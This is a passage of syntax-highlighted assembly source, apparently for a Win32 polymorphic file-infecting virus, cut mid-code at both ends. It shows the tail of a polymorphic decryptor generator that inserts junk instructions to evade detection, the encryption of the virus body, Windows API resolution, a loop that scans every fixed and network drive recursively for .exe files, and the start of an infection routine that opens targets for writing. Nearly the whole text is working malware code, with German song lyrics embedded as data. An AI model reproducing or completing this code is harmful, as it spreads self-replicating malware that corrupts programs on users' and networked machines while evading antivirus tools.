        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save it</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; and store it</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8089h</span><span class="sc0">                            </span><span class="sc1">; mov [reg32+imm32], reg32</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                              </span><span class="sc1">; AL=imagebase register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">; inc reg32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                             </span><span class="sc1">; DEC reg32</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                               </span><span class="sc1">; decrement the counter reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; store instruction</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">                             </span><span class="sc1">; JNZ opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_head</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                            </span><span class="sc1">; jmp near</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">; ----- END OF POLY ENGINE --------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_buffer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EAX=memory buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.poly_virus_body</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.decryptor_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.jmp_displacement_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.write_section_RVA_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.virus_RVA_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.imagebase_ptr</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; EAX=old delta offset</span><span class="sc0">
                                                </span><span class="sc1">; EBP=memory buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.start_virusbody</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save old delta offset</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save old delta offset</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; get a dword of plaintext</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; encrypt it</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store encrypted dword</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">encrypt_loop</span><span class="sc0">                       </span><span class="sc1">; do the next dword</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; ECX=end of poly virus body</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.poly_virus_body</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDX=start of poly virus body</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; ECX=poly virus body length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.poly_virus_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; store it</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; EAX=old delta offset</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">other_API_names</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; first regular API VA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">number_of_other_APIs</span><span class="sc0">           </span><span class="sc1">; number of APIs to scan for</span><span class="sc0">

</span><span class="sc5">Get_APIs_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; save number of APIs left</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; get this API address</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.kernel32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.GetProcAddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store API address</span><span class="sc0">

</span><span class="sc5">search_next_API_name</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; search end of API name</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">search_next_API_name</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; restore number of APIs left</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">Get_APIs_loop</span><span class="sc0">


</span><span class="sc1">; ----- START SCANNING ALL DRIVES -------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.drive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"\:C"</span><span class="sc0">                  </span><span class="sc1">; start with C:\ drive</span><span class="sc0">

</span><span class="sc5">scan_all_drives_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.drive</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; EAX=ptr to drive name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; push it for SetCurDirA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; get type of this drive</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                              </span><span class="sc1">; fixed drive ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">scan_drive</span><span class="sc0">                           </span><span class="sc1">; if yes, infect it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">; remote/network drive?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">scan_drive</span><span class="sc0">                           </span><span class="sc1">; if yes, infect it</span><span class="sc0">

                                                </span><span class="sc1">; we can't infect this drive</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; remove shit from stack</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">scan_next_drive</span><span class="sc0">                     </span><span class="sc1">; try next drive</span><span class="sc0">

</span><span class="sc5">scan_drive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; go to root dir of this drv</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">rec_search</span><span class="sc0">                         </span><span class="sc1">; and start scanning there</span><span class="sc0">

</span><span class="sc5">scan_next_drive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.drive</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; try next drive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.drive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"Z"</span><span class="sc0">           </span><span class="sc1">; done all drives ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">scan_all_drives_loop</span><span class="sc0">                </span><span class="sc1">; if not, scan on</span><span class="sc0">


        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ExitProcess</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; quit task if all is done</span><span class="sc0">


</span><span class="sc1">; ----- INFECT CURRENT DIRECTORY --------------------------------------------</span><span class="sc0">

</span><span class="sc5">rec_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileAttributes</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EAX=ptr to FindFileStructure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; push it</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">filemask_next</span><span class="sc0">                      </span><span class="sc1">; push pointer to "*.*", 0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filemask_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; find the first file</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; -1 means error</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">error_exit</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; restore search handle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save search handle</span><span class="sc0">


</span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileName</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; EDI=pointer to filename</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; is this file a directory ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">; sleep a while</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Sleep</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; search for end of filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; EAX=filename extension</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">202020h</span><span class="sc0">                         </span><span class="sc1">; make lowercase</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"exe"</span><span class="sc0">                          </span><span class="sc1">; is it a .EXE file ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">search_on</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">                        </span><span class="sc1">; if yes, try to infect it</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">search_on</span><span class="sc0">                           </span><span class="sc1">; if not, search next file</span><span class="sc0">

</span><span class="sc5">directory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">                 </span><span class="sc1">; is it the "." or ".." dir ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">search_on</span><span class="sc0">                            </span><span class="sc1">; if yes, forget it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; if not, change dir to there</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rec_search</span><span class="sc0">                         </span><span class="sc1">; and search the files in</span><span class="sc0">
                                                </span><span class="sc1">; there recursively</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc3">".."</span><span class="sc0">                     </span><span class="sc1">; go back down in the tree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; remove the ".." from stack</span><span class="sc0">

</span><span class="sc5">search_on</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">; EDX=search handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">; save it back to stack</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileAttributes</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EAX=ptr to FindFileStructure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FindNextFileA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; find next file</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; zero means error</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">                         </span><span class="sc1">; if no error, search on</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FindClose</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; close the filesearch</span><span class="sc0">
</span><span class="sc5">error_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Du bist schon berall gewesen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Du hast die Berge und das Meer gesehen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Die Menschen, Tiere und Maschinen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Und du redest mit ihnen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Es gibt unzhlige Geschichten, die ber dich im Umlauf sind"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"An jedem Ort von dir berichten, so wie Bltter im Wind"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; These are lyrics from the wounderful song "Live at the electric Avenue" by</span><span class="sc0">
</span><span class="sc1">; Kante. Its a song about a person (or a allegoric figure) that moves around</span><span class="sc0">
</span><span class="sc1">; the world, never staying for long in one place, leaving lots of rumours</span><span class="sc0">
</span><span class="sc1">; about him behind, existing more like a shadow or a ghost.</span><span class="sc0">
</span><span class="sc1">; Here the English translation:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "You have already been everywhere</span><span class="sc0">
</span><span class="sc1">;  You know the mountains and the see</span><span class="sc0">
</span><span class="sc1">;  The people, animals and machines</span><span class="sc0">
</span><span class="sc1">;  And you talk with them</span><span class="sc0">
</span><span class="sc1">;  There is an uncountable number of stories that are around about you</span><span class="sc0">
</span><span class="sc1">;  and tell about you in every place, just like leaves in the wind"</span><span class="sc0">

</span><span class="sc1">; ----- INFECT A FILE -------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                </span><span class="sc1">; normal attributes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; offset filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">quit_infect_error</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; template file (shit)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                </span><span class="sc1">; file attributes (normal)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                  </span><span class="sc1">; open existing</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; security attributes (shit)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; do not share file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">                         </span><span class="sc1">; read/write mode</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; offset filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.CreateFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">restore_attributes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">workspace</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; name file mapping obj (shit)</span><span class="sc0">
